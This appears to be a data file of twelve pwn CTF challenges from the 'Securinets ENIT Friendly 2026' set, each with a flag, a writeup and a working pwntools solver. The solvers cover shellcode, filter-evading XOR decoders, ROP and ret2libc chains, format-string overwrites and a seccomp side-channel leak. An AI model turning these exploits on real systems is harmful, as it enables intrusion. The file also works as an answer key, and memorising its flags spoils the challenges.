@@ -1,0 +1,234 @@
+[
+  {
+    "slug": "black-flash",
+    "title": "Black Flash",
+    "category": "Pwn",
+    "collection": "Securinets ENIT Friendly 2026",
+    "author": "r3t0x",
+    "date": "2026-10-15",
+    "points": 250,
+    "difficulty": 2,
+    "description": "Jujutsu High's cursed-tool shop is running a Black Flash Sale. Your wallet is weak, the minimum order is absurd, and accounting insists its math is flawless. Surely you can afford nothing.",
+    "tags": [
+      "integer-overflow"
+    ],
+    "flag": "SecurinetsENIT{bl4ck_fl4sh_s4l3_wr4pp3d_4r0und}",
+    "writeup": "## Solution\n\nThe shop multiplies the requested quantity and the 65,536-credit price in a\n32-bit unsigned integer. Ordering 65,536 tools satisfies the wholesale minimum,\nbut the product is exactly `2^32` and wraps to zero. The zero total is below the\n100-credit balance, so the approved-payment path prints the flag.\n\nThe reference solver only needs to submit `65536` at the quantity prompt.",
+    "solver": "from pwn import *\np = process(\"./main\")\np.sendlineafter(b\"Quantity: \", b\"65536\")\nprint(p.recvall().decode())\n",
+    "solverLanguage": "python"
+  },
+  {
+    "slug": "grade-4-technique",
+    "title": "Grade 4 Technique",
+    "category": "Pwn",
+    "collection": "Securinets ENIT Friendly 2026",
+    "author": "r3t0x",
+    "date": "2026-10-15",
+    "points": 250,
+    "difficulty": 2,
+    "description": "Your cursed technique has finally been approved for live demonstration. The evaluators have lowered their expectations accordingly. Try not to embarrass the CPU.",
+    "tags": [
+      "shellcode",
+      "x86-64"
+    ],
+    "flag": "SecurinetsENIT{gr4d3_4_t3chn1qu3_st1ll_g0t_4_sh3ll}",
+    "writeup": "## Solution\n\nThe service maps a page with read, write, and execute permissions, copies up to 256\nbytes from standard input into it, and calls the mapping directly. There is no\nshellcode filter, so ordinary amd64 `execve(\"/bin/sh\")` shellcode is sufficient.\n\nAfter the shell starts, request `/flag` (or the local `flag.txt`) to recover the\nchallenge flag.",
+    "solver": "from pwn import *\n\ncontext.arch = \"amd64\"\np = remote(\"localhost\", 1349)\np.sendafter(b\"Technique: \", asm(shellcraft.sh()))\np.recvuntil(b\"Evaluation begins. Expectations remain manageable.\\n\")\np.sendline(b\"cat flag.txt\")\np.interactive()\n",
+    "solverLanguage": "python"
+  },
+  {
+    "slug": "return-policy",
+    "title": "Return Policy",
+    "category": "Pwn",
+    "collection": "Securinets ENIT Friendly 2026",
+    "author": "r3t0x",
+    "date": "2026-10-15",
+    "points": 250,
+    "difficulty": 2,
+    "description": "Jujutsu High guarantees every trainee returns safely. The guarantee was written by the same people who approved this program.",
+    "tags": [
+      "stack-overflow",
+      "ret2win"
+    ],
+    "flag": "SecurinetsENIT{th3_r3turn_p0l1cy_w4s_0pt10n4l}",
+    "writeup": "## Solution\n\n`orientation` reads 256 bytes into a 64-byte stack buffer. The saved return\naddress is 72 bytes from the start of that buffer, and the binary exposes a `win`\nfunction that opens and prints the flag.\n\nPad to offset 72 and replace the saved return address with `win`. No arguments or\nsecond stage are needed.",
+    "solver": "from pwn import *\n\ncontext.binary = elf = ELF(\"./main\", checksec=False)\np = remote(args.HOST or \"localhost\", int(args.PORT or 1354))\np.sendlineafter(b\"Graduation statement: \", flat({72: elf.sym.win}))\nprint(p.recvall().decode())\n",
+    "solverLanguage": "python"
+  },
+  {
+    "slug": "strongest-argument",
+    "title": "Strongest Argument",
+    "category": "Pwn",
+    "collection": "Securinets ENIT Friendly 2026",
+    "author": "r3t0x",
+    "date": "2026-10-15",
+    "points": 250,
+    "difficulty": 2,
+    "description": "Gojo said a strong argument wins every debate. You brought confidence; the CPU is still waiting for an actual value.",
+    "tags": [
+      "stack-overflow",
+      "rop",
+      "calling-convention"
+    ],
+    "flag": "SecurinetsENIT{0n3_str0ng_4rgum3nt_b34ts_th3_st4ck}",
+    "writeup": "## Solution\n\nThe debate function has the same 72-byte offset to its saved return address, but\n`win` only succeeds when its first SysV amd64 argument equals\n`0x1337c0decafebabe`. The binary deliberately provides a `pop rdi; ret` gadget.\n\nThe complete chain is padding, `pop rdi; ret`, the approved value, and `win`.\nThis sets `rdi` before transferring control to the flag-printing function.",
+    "solver": "from pwn import *\n\ncontext.binary = elf = ELF(\"./main\", checksec=False)\np = remote(args.HOST or \"localhost\", int(args.PORT or 1355))\npayload = flat(b\"A\" * 72, elf.sym.pop_rdi_ret, 0x1337c0decafebabe, elf.sym.win)\np.sendlineafter(b\"Your argument: \", payload)\nprint(p.recvall().decode())\n",
+    "solverLanguage": "python"
+  },
+  {
+    "slug": "forbidden-vocabulary",
+    "title": "Forbidden Vocabulary",
+    "category": "Pwn",
+    "collection": "Securinets ENIT Friendly 2026",
+    "author": "r3t0x",
+    "date": "2026-10-15",
+    "points": 250,
+    "difficulty": 2,
+    "description": "Jujutsu High reviewed your technique and declared it completely safe. The review lasted eleven seconds, so naturally nothing can go wrong.",
+    "tags": [
+      "shellcode"
+    ],
+    "flag": "SecurinetsENIT{curs3d_sp33ch_r3wr0t3_1ts3lf}",
+    "writeup": "## Solution\n\nThe submitted shellcode may not contain null, newline, `syscall`, slash, or\n`int 0x80` bytes. The destination is still writable and executable, so encode a\nnormal `execve(\"/bin/sh\")` body with a single-byte XOR key whose encoded form\navoids the banned set.\n\nA short position-independent decoder obtains the encoded body's address with a\ncall/pop sequence, XORs it back in place, and jumps to it. The reference solver\nsearches for a safe key and verifies that the complete payload contains no banned\nbyte before sending it.",
+    "solver": "from pwn import *\n\ncontext.arch = \"amd64\"\nbad = {0x00, 0x0a, 0x0f, 0x05, 0x2f, 0xcd}\nbody = asm(shellcraft.sh())\nkey = next(k for k in range(1, 256) if k not in bad and all((b ^ k) not in bad for b in body))\ndecoder = asm(f\"\"\"\n    jmp get_body\ndecode:\n    pop rsi\n    push rsi\n    xor ecx, ecx\n    mov cl, {len(body)}\n    mov al, {key}\ndecode_byte:\n    xor byte ptr [rsi], al\n    inc rsi\n    loop decode_byte\n    pop rsi\n    jmp rsi\nget_body:\n    call decode\n\"\"\")\npayload = decoder + bytes(b ^ key for b in body)\nassert len(payload) <= 192 and not set(payload) & bad\n\np = remote(\"localhost\", 1350)\np.sendafter(b\"Technique: \", payload)\np.recvuntil(b\"Approved. The committee remains confidently underqualified.\\n\")\np.sendline(b\"cat flag.txt\")\np.interactive()\n",
+    "solverLanguage": "python"
+  },
+  {
+    "slug": "nah",
+    "title": "NAH",
+    "category": "Pwn",
+    "collection": "Securinets ENIT Friendly 2026",
+    "author": "r3t0x",
+    "date": "2026-10-15",
+    "points": 250,
+    "difficulty": 2,
+    "description": "Jujutsu High sealed a special-grade cursed object behind its newest barrier. You are a Grade 4 sorcerer with no clearance, no technique, and somehow terminal access. The higher-ups are certain you cannot retrieve it. They are famously competent.",
+    "tags": [
+      "integer-truncation",
+      "file-descriptors"
+    ],
+    "flag": "SecurinetsENIT{n4h_1d_4uth0r1z3_fd_256}",
+    "writeup": "## Solution\n\nThe service stores the protected descriptor in a `uint8_t`, but later accepts the\nrequested descriptor as a full integer. Registering 253 dummy objects consumes file\ndescriptors 3 through 255. Opening the flag next returns descriptor 256, which is\ntruncated to zero in `protected_fd`.\n\nRequest descriptor 256. It is not equal to the stored zero, yet `read(256, ...)`\nstill targets the real flag descriptor and prints its contents.",
+    "solver": "from pwn import *\np = process(\"./main\")\np.send(b\"1\\n\" * 253 + b\"2\\n3\\n256\\n4\\n\")\nprint(p.recvall().decode())\n",
+    "solverLanguage": "python"
+  },
+  {
+    "slug": "read-it-and-weep",
+    "title": "Read It and Weep",
+    "category": "Pwn",
+    "collection": "Securinets ENIT Friendly 2026",
+    "author": "r3t0x",
+    "date": "2026-10-15",
+    "points": 250,
+    "difficulty": 2,
+    "description": "Jujutsu High prints every complaint exactly as submitted. Your opinion matters almost as much as their memory-safety policy.",
+    "tags": [
+      "format-string",
+      "got-overwrite"
+    ],
+    "flag": "SecurinetsENIT{r34d_g0t_r3wr1tt3n_n0w_1t_w33ps}",
+    "writeup": "## Solution\n\nThe complaint is passed directly to `printf`, giving a format-string write, and\nthe binary's writable GOT is available at fixed addresses. At format argument\noffset 10, use `fmtstr_payload` to replace the low two bytes of `read@GOT` with\nthe low two bytes of `win`.\n\nImmediately afterward the program calls `read` for the signature. That GOT call\nnow enters `win`, which opens and prints the flag.",
+    "solver": "from pwn import *\n\ncontext.binary = elf = ELF(\"./main\", checksec=False)\np = remote(args.HOST or \"localhost\", int(args.PORT or 1356))\npayload = fmtstr_payload(10, {elf.got.read: p16(elf.sym.win & 0xffff)}, write_size=\"short\")\np.sendlineafter(b\"Complaint: \", payload)\nprint(p.recvall().decode())\n",
+    "solverLanguage": "python"
+  },
+  {
+    "slug": "special-grade-paperwork",
+    "title": "Special Grade Paperwork",
+    "category": "Pwn",
+    "collection": "Securinets ENIT Friendly 2026",
+    "author": "r3t0x",
+    "date": "2026-10-15",
+    "points": 500,
+    "difficulty": 3,
+    "description": "Jujutsu High hired a special-grade security committee and gave it a clipboard. Your data has never been safer, statistically speaking.",
+    "tags": [
+      "canary-leak",
+      "ret2libc",
+      "rop"
+    ],
+    "flag": "SecurinetsENIT{c4n4ry_l34k_t0_l1bc_r3t2l1bc}",
+    "writeup": "## Solution\n\nThe 64-byte report is followed by alignment padding and the stack canary. The\n80-byte preview therefore discloses the canary in bytes 72 through 79. The final\ncopy then reads 256 bytes into the same buffer, providing a canary-preserving stack\noverflow.\n\nUse the first ROP stage to call `puts(puts@GOT)` and return to `main`. Subtract\nthe bundled libc's `puts` offset from the leak. Repeat the interaction with the\nknown canary, then return to `system(\"/bin/sh\")` and read the flag.",
+    "solver": "from pwn import *\n\ncontext.binary = elf = ELF(\"./main\", checksec=False)\nlibc = ELF(\"./libc.so.6\", checksec=False)\nio = remote(args.HOST or \"localhost\", int(args.PORT or 1353))\n\nrop = ROP(elf)\npop_rdi = rop.find_gadget([\"pop rdi\", \"ret\"]).address\nret = rop.find_gadget([\"ret\"]).address\n\nio.sendafter(b\"Draft: \", b\"A\" * 64)\nio.recvuntil(b\"Committee preview:\\n\")\npreview = io.recvn(80)\ncanary = u64(preview[72:80])\n\nstage_one = flat(\n    b\"A\" * 72,\n    canary,\n    b\"B\" * 8,\n    ret,\n    pop_rdi,\n    elf.got.puts,\n    elf.plt.puts,\n    ret,\n    elf.sym.main,\n)\nio.sendafter(b\"Final copy: \", stage_one)\nio.recvuntil(b\"Filed.\\n\")\nlibc.address = u64(io.recvn(6).ljust(8, b\"\\0\")) - libc.sym.puts\nio.recvuntil(b\"\\n\")\n\nio.sendafter(b\"Draft: \", b\"A\" * 64)\nio.recvuntil(b\"Committee preview:\\n\")\nio.recvn(80)\n\nstage_two = flat(\n    b\"A\" * 72,\n    canary,\n    b\"B\" * 8,\n    ret,\n    pop_rdi,\n    next(libc.search(b\"/bin/sh\\0\")),\n    libc.sym.system,\n)\nio.sendafter(b\"Final copy: \", stage_two)\nio.recvuntil(b\"Filed.\\n\")\nio.sendline(b\"cat /flag\")\nio.interactive()\n",
+    "solverLanguage": "python"
+  },
+  {
+    "slug": "infinite-void-free-tier",
+    "title": "Infinite Void",
+    "category": "Pwn",
+    "collection": "Securinets ENIT Friendly 2026",
+    "author": "r3t0x",
+    "date": "2026-10-15",
+    "points": 1000,
+    "difficulty": 5,
+    "description": "Unlimited knowledge is included. Exporting it requires the premium plan, which your team apparently could not afford.",
+    "tags": [
+      "seccomp",
+      "blind-exfiltration",
+      "side-channel"
+    ],
+    "flag": "SecurinetsENIT{1nf1n1t3_v01d_h4s_0n3_b1t_0f_b4ndw1dth}",
+    "writeup": "## Solution\n\nThe seccomp policy allows `openat`, `read`, and exit calls, but not `write`, so\nthe flag cannot be returned directly. Shellcode can still open and read `/flag`,\ncompare one chosen byte with a guess, and conditionally block in an allowed read\nfrom standard input.\n\nAn immediate exit means the secret byte is at most the guess; a connection that\nremains alive means it is greater. Binary-search printable ASCII with this one-bit\noracle for each position, starting from the known `SecurinetsENIT{` prefix, until\nthe closing brace is recovered.",
+    "solver": "from pwn import *\n\ncontext.arch = \"amd64\"\nknown = b\"SecurinetsENIT{\"\n\nwhile known[-1:] != b\"}\" and len(known) < 80:\n    low, high = 32, 126\n\n    while low < high:\n        guess = (low + high) // 2\n        code = asm(f\"\"\"\n            sub rsp, 0x100\n            mov rbx, 0x67616c662f\n            mov qword ptr [rsp], rbx\n            mov eax, 257\n            mov rdi, -100\n            mov rsi, rsp\n            xor edx, edx\n            xor r10d, r10d\n            syscall\n            mov edi, eax\n            lea rsi, [rsp + 0x20]\n            mov edx, 0x80\n            xor eax, eax\n            syscall\n            movzx eax, byte ptr [rsp + 0x20 + {len(known)}]\n            cmp eax, {guess}\n            jbe done\n            xor eax, eax\n            xor edi, edi\n            lea rsi, [rsp + 0xa0]\n            mov edx, 1\n            syscall\n        done:\n            mov eax, 60\n            xor edi, edi\n            syscall\n        \"\"\")\n\n        p = remote(\"localhost\", 1351, level=\"error\")\n        p.sendafter(b\"Technique: \", code)\n        p.recvuntil(b\"Technique accepted.\\n\")\n\n        try:\n            p.recv(1, timeout=0.2)\n        except EOFError:\n            pass\n\n        alive = p.connected(\"recv\")\n\n        if alive:\n            low = guess + 1\n            p.send(b\"X\")\n        else:\n            high = guess\n\n        p.close()\n\n    known += bytes([low])\n    print(known.decode(), flush=True)\n",
+    "solverLanguage": "python"
+  },
+  {
+    "slug": "reach-back",
+    "title": "Reach Back",
+    "category": "Pwn",
+    "collection": "Securinets ENIT Friendly 2026",
+    "author": "r3t0x",
+    "date": "2026-10-15",
+    "points": 250,
+    "difficulty": 2,
+    "description": "The secret was already delivered. You just need to remember where the caller left it.\n\nUpload one x86-64 shared object exporting `solve` and make the sandbox print the flag.",
+    "tags": [
+      "assembly",
+      "seccomp",
+      "shared-library"
+    ],
+    "flag": "SecurinetsENIT{826911fc00150e92abba62709557ee1e955e5ba4148d7f511eafea0f700f89e7}",
+    "writeup": "## Solution\n\nThe caller opens the flag before installing seccomp, reads it into its own stack\nframe, and then calls the uploaded `solve` function. At `solve` entry the saved\nflag buffer begins exactly `0x40` bytes above `rsp`. Although the sandbox blocks\nfile access, it still permits `write`.\n\nExport a relocation-free `solve` function that writes 128 bytes from\n`rsp + 0x40` to standard output and returns. Build it as a shared object and send\none base64 line to the service:\n\n```bash\nas --64 -o solve.o solve.s\nld -shared -z noexecstack -o solve.so solve.o\nbase64 -w0 solve.so | nc pwn.securinets-enit.club 1321\n```",
+    "solver": ".intel_syntax noprefix\n\n.global solve\n.type solve, @function\n.section .text\nsolve:\n    lea rsi, [rsp + 0x40]\n    mov edi, 1\n    mov edx, 0x80\n    mov eax, 1\n    syscall\n    ret\n.size solve, .-solve\n\n.section .note.GNU-stack,\"\",@progbits\n",
+    "solverLanguage": "x86asm"
+  },
+  {
+    "slug": "reverse-slice",
+    "title": "::-1",
+    "category": "Pwn",
+    "collection": "Securinets ENIT Friendly 2026",
+    "author": "r3t0x",
+    "date": "2026-10-15",
+    "points": 700,
+    "difficulty": 4,
+    "description": "Jujutsu High reviewed your technique twice and certified it completely harmless. Please try to look surprised when the paperwork catches fire.",
+    "tags": [
+      "format-string",
+      "pie-leak",
+      "stack-write"
+    ],
+    "flag": "SecurinetsENIT{r3v3rs3_th3_f0rm4t_n0t_th3_d4m4g3}",
+    "writeup": "## Solution\n\nEach submitted payload is reversed before it reaches vulnerable `printf`. Reverse\nthe payload on the client as well, so the intended format string is restored by the\nservice. During the first inspection, `%74$p|%75$p` leaks the saved frame pointer\nand the PIE return address.\n\nRebase the ELF from the return leak and calculate the saved return-address slot as\n`saved_rbp - 0x18`. For the second inspection, create a byte-wise format-string\npayload at argument offset 8 that writes the rebased `win` address into that slot,\nreverse it for transport, and let the function return.",
+    "solver": "from pwn import *\n\ncontext.binary = elf = ELF(\"./main\", checksec=False)\nio = remote(args.HOST or \"localhost\", int(args.PORT or 1352))\n\nleak = b\"%74$p|%75$p\"\nio.sendlineafter(b\"Length: \", str(len(leak)).encode())\nio.sendafter(b\"Technique: \", leak[::-1])\nio.recvuntil(b\"Verdict: \")\nsaved_rbp, return_address = [int(value, 16) for value in io.recvline().strip().split(b\"|\")]\n\npie = return_address - (elf.sym.main + 0x80)\nsaved_rip = saved_rbp - 0x18\npayload = fmtstr_payload(8, {saved_rip: pie + elf.sym.win}, write_size=\"byte\")\n\nio.sendlineafter(b\"Length: \", str(len(payload)).encode())\nio.sendafter(b\"Technique: \", payload[::-1])\nio.interactive()\n",
+    "solverLanguage": "python"
+  },
+  {
+    "slug": "rudimentary-calculator",
+    "title": "CALCULUS II",
+    "category": "Pwn",
+    "collection": "Securinets ENIT Friendly 2026",
+    "author": "r3t0x",
+    "date": "2026-10-15",
+    "points": 600,
+    "difficulty": 4,
+    "description": "F**k calculus",
+    "tags": [
+      "out-of-bounds-read",
+      "stack-overflow",
+      "ret2libc"
+    ],
+    "flag": "SecurinetsENIT{d3c1m4l_w4s_n3v3r_th3_pr0bl3m}",
+    "writeup": "## Solution\n\nAn input containing `\"1\\0\"` remains a valid expression while bytes after the\nembedded null overwrite `display_len`. Setting it to 105 makes the octal printer\nread nine limbs beyond the 96-limb product array. Decode that octal integer into\n32-bit words to recover the stack canary and saved return address, then derive the\nPIE base.\n\nAn oversized `quit` request makes the calculator return through attacker data.\nPreserve the canary and first call `puts(puts@GOT)`, returning to `main` to turn\nthe leak into a libc base. A second canary-preserving chain calls\n`system(\"/bin/sh\")` and reads the flag.",
+    "solver": "from pwn import *\n\ncontext.binary = elf = ELF(\"./main\", checksec=False)\nlibc = ELF(\"./libc.so.6\", checksec=False)\nld = ELF(\"./ld-linux-x86-64.so.2\", checksec=False)\nio = remote(args.HOST or \"pwn.securinets-enit.club\", int(args.PORT or 1338)) if args.REMOTE else process([ld.path, \"--library-path\", \".\", elf.path])\n\nleak_request = b\"1\\x00\".ljust(0x1000, b\"A\") + p32(105)\nio.sendlineafter(b\"Bytes: \", str(len(leak_request)).encode())\nio.sendafter(b\"Expression: \", leak_request)\nio.recvuntil(b\"Product: \")\nnumber = int(io.recvline().strip(), 8)\nwords = [(number >> (32 * index)) & 0xffffffff for index in range(105)]\n\ncanary = words[99] | words[100] << 32\nsaved_rip = words[103] | words[104] << 32\nelf.address = saved_rip - (elf.sym.main + 0x80)\npop_rdi = elf.sym.service_record\nret = pop_rdi + 1\n\nstage_one = b\"quit\\x00\".ljust(0x1198, b\"A\") + flat(\n    canary,\n    0,\n    ret,\n    pop_rdi,\n    elf.got.puts,\n    elf.plt.puts,\n    ret,\n    elf.sym.main,\n)\nio.sendlineafter(b\"Bytes: \", str(len(stage_one)).encode())\nio.sendafter(b\"Expression: \", stage_one)\n\nraw_leak = io.recvuntil(b\"CALCULUS II\\n\", drop=True)\nlibc.address = u64(raw_leak[:-1].ljust(8, b\"\\x00\")) - libc.sym.puts\n\nstage_two = b\"quit\\x00\".ljust(0x1198, b\"A\") + flat(\n    canary,\n    0,\n    ret,\n    pop_rdi,\n    next(libc.search(b\"/bin/sh\\x00\")),\n    libc.sym.system,\n    ret,\n    libc.sym.exit,\n)\nio.sendlineafter(b\"Bytes: \", str(len(stage_two)).encode())\nio.sendafter(b\"Expression: \", stage_two)\nio.sendline(b\"cat /flag 2>/dev/null || cat flag.txt\")\nio.recvuntil(b\"SecurinetsENIT{\")\nprint((b\"SecurinetsENIT{\" + io.recvuntil(b\"}\")).decode())\n",
+    "solverLanguage": "python"
+  }
+]
